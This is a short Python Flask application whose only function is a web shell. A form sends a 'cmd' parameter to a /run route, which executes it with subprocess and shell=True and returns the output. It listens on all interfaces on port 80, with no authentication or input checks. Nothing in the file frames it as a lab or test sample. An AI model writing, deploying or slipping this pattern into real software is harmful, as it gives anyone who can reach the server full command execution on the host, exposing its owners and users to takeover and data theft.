import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def home():
    return '''
        <form method="GET" action="/run">
            <input name="cmd" placeholder="Enter command">
            <button type="submit">Run</button>
        </form>
    '''

@app.route('/run', methods=['GET'])
def run():
    cmd = request.args.get('cmd', '')
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        return f"<pre>{result}</pre>"
    except subprocess.CalledProcessError as e:
        return f"<pre>Error: {e.output}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
